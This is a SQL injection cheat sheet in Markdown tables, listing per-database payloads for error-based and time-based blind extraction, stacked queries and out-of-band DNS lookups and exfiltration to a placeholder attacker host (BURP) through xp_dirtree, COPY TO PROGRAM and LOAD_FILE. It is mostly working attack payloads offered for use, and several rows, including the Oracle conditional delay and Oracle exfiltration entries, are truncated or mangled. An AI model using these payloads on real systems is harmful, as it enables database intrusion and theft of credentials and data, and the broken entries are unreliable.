# 🛡️ SQL Injection Cheat Sheet

### 🔗 String Concatenation

| DBMS            | Syntax                                                  |
| --------------- | ------------------------------------------------------- |
| **Oracle**      | `'foo'\|\|'bar'`                                        |
| **Microsoft**   | `'foo' + 'bar'`                                         |
| **PostgreSQL**  | `'foo'\|\|'bar''`                                       |
| **MySQL**       | `'foo' 'bar'` _(with space)_  <br>`CONCAT('foo','bar')` |
| ***example***** | `username\|\|\|':'\|\|\|password`                       |

---

### 🔍 Substring Extraction

|DBMS|Syntax|Returns `'ba'`|
|---|---|---|
|**Oracle**|`SUBSTR('foobar', 4, 2)`|✔|
|**Microsoft**|`SUBSTRING('foobar', 4, 2)`|✔|
|**PostgreSQL**|`SUBSTRING('foobar', 4, 2)`|✔|
|**MySQL**|`SUBSTRING('foobar', 4, 2)`|✔|

---

### 💬 Comments (Query Truncation)

|DBMS|Syntax|
|---|---|
|**Oracle**|`-- comment`|
|**Microsoft**|`-- comment`, `/* comment */`|
|**PostgreSQL**|`-- comment`, `/* comment */`|
|**MySQL**|`# comment`, `-- comment` _(space required)_, `/* comment */`|

---

### 🏷️ Database Version Disclosure

|DBMS|Query|
|---|---|
|**Oracle**|`SELECT banner FROM v$version`  <br>`SELECT version FROM v$instance`|
|**Microsoft**|`SELECT @@version`|
|**PostgreSQL**|`SELECT version()`|
|**MySQL**|`SELECT @@version`|

---

### 📋 Listing Tables and Columns

| DBMS           | Tables                                    | Columns                                                               |
| -------------- | ----------------------------------------- | --------------------------------------------------------------------- |
| **Oracle**     | `SELECT * FROM all_tables`                | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE'`            |
| **Microsoft**  | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE'` |
| **PostgreSQL** | Same as Microsoft                         | Same                                                                  |
| **MySQL**      | Same as Microsoft                         | Same                                                                  |

---

### ⚠️ Conditional Errors

| DBMS           | Syntax                                                                   |
| -------------- | ------------------------------------------------------------------------ |
| **Oracle**     | `SELECT CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| **Microsoft**  | `SELECT CASE WHEN (COND) THEN 1/0 ELSE NULL END`                         |
| **PostgreSQL** | `1 = (SELECT CASE WHEN (COND) THEN 1/(SELECT 0) ELSE NULL END)`          |
| **MySQL**      | `SELECT IF(COND,(SELECT table_name FROM information_schema.tables),'a')` |

---

### 🕵️ Extract Data via Errors

|DBMS|Payload|Error Example|
|---|---|---|
|**Microsoft**|`SELECT 'foo' WHERE 1 = (SELECT 'secret')`|`Conversion failed...`|
|**PostgreSQL**|`SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`|`invalid input syntax for integer: "secret"`|
|**MySQL**|`SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`|`XPATH syntax error: '\secret'`|

---

### 📦 Batched (Stacked) Queries

|DBMS|Syntax|Notes|
|---|---|---|
|**Oracle**|❌ _Not supported_||
|**Microsoft**|`QUERY1; QUERY2` or `QUERY1 QUERY2`|✔|
|**PostgreSQL**|`QUERY1; QUERY2`|✔|
|**MySQL**|`QUERY1; QUERY2`|⚠️ _Limited by API and settings_|

---

### ⏱️ Time Delays (Unconditional)

|DBMS|Syntax|
|---|---|
|**Oracle**|`dbms_pipe.receive_message(('a'),10)`|
|**Microsoft**|`WAITFOR DELAY '0:0:10'`|
|**PostgreSQL**|`SELECT pg_sleep(10)`|
|**MySQL**|`SELECT SLEEP(10)`|

---

### ⏳ Conditional Time Delays

|DBMS|Syntax|
|---|---|
|**Oracle**|`SELECT CASE WHEN (COND) THEN 'a'|
|**Microsoft**|`IF (COND) WAITFOR DELAY '0:0:10'`|
|**PostgreSQL**|`SELECT CASE WHEN (COND) THEN pg_sleep(10) ELSE pg_sleep(0) END`|
|**MySQL**|`SELECT IF(COND, SLEEP(10), 'a')`|

---

### 🌐 DNS Lookup (OOB Interaction)

|DBMS|Payload|
|---|---|
|**Oracle**|`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP/"> %remote;]>'),'/l') FROM dual`  <br>`SELECT UTL_INADDR.get_host_address('BURP')` _(elevated)_|
|**Microsoft**|`EXEC master..xp_dirtree '//BURP/a'`|
|**PostgreSQL**|`COPY (SELECT '') TO PROGRAM 'nslookup BURP'`|
|**MySQL**|`LOAD_FILE('\\\\BURP\\a')`  <br>`SELECT ... INTO OUTFILE '\\\\BURP\\a'` _(Windows only)_|

---

### 📤 DNS Data Exfiltration

| DBMS           | Payload                                                                                         |
| -------------- | ----------------------------------------------------------------------------------------------- |
| **Oracle**     | `SELECT EXTRACTVALUE(xmltype('<?xml... <!ENTITY % remote SYSTEM "http://'                       |
| **Microsoft**  | `DECLARE @p VARCHAR(1024); SET @p=(SELECT QUERY); EXEC('master..xp_dirtree "//'+@p+'.BURP/a"')` |
| **PostgreSQL** | Custom function calling `nslookup (SELECT QUERY).BURP`                                          |
| **MySQL**      | `SELECT QUERY INTO OUTFILE '\\\\BURP\\a'` _(Windows only)_                                      |
